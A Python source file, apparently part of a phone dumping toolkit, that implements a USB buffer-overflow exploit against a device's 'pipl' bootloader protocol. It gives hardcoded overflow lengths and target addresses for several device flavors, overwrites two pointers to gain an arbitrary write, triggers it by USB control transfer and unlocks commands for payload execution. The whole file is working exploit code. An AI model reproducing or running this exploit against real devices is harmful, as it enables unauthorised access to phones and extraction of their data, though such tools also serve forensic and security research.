import struct

from dump.pipl.pipl_protocol import PiplProtocol


class PiplExploit(PiplProtocol):

    def parse_opts(self, opts):
        super().parse_opts(opts)

        self.flavor = opts["exploit_flavor"]
        if self.flavor == "A":
            self.ptr_to_zero = 0x22
            self.ptr_to_write = 0x8000525f
            self.restore_setup = 0x80026bb6
            self.overflow_bytes = 0x807d
        elif self.flavor == "A2":
            self.ptr_to_zero = 0x30000004
            self.ptr_to_write = 0x8022C25D
            self.restore_setup = 0x8024DBB7
            self.overflow_bytes = 0x807E
        elif self.flavor == "B":
            self.ptr_to_zero = 0x81142a69
            self.ptr_to_write = 0x8110029a
            self.restore_setup = 0x81142a16
            self.overflow_bytes = 0x807d
        elif self.flavor == "C":
            self.ptr_to_zero = 0x81162ab4
            self.ptr_to_write = 0x811402ba
            self.restore_setup = 0x81162a5c
            self.overflow_bytes = 0x8097
        elif self.flavor == "C2":
            self.ptr_to_zero = 0x80000002
            self.ptr_to_write = 0x811002BA
            self.restore_setup = 0x81142A36
            self.overflow_bytes = 0x807d
        else:
            raise RuntimeError("unsupported exploit flavor {}".format(self.flavor))


    def execute(self, dev, output):
        super().execute(dev, output)

        # overwrite two pointers: pointer to setup's EP (must point to a zero byte), pointer to setup buffer contents (used for arb write)
        data = self.comm(0x20, variable_payload=b"\x00" * self.overflow_bytes + struct.pack("<II", self.ptr_to_zero, self.ptr_to_write))
        try:
            # trigger write to controlled ptr
            self.dev.ctrl_transfer(0x80, 0x06, 0x100, 0x100, 0x100)
        except Exception:
            pass

        # restore original contents
        self.comm_oneway(0x20, variable_payload=b"\x00" * self.overflow_bytes + struct.pack("<II", self.ptr_to_zero, self.restore_setup))

        # at this point all commands should be unlocked
        print("!! Restart the phone before running another payload !!")

        # init for payload exec mode
        self.comm(3, variable_payload=b"\x00")

        # for some reason this has an extra response for cmd 3
        if self.flavor == "A2":
            self.read_resp()
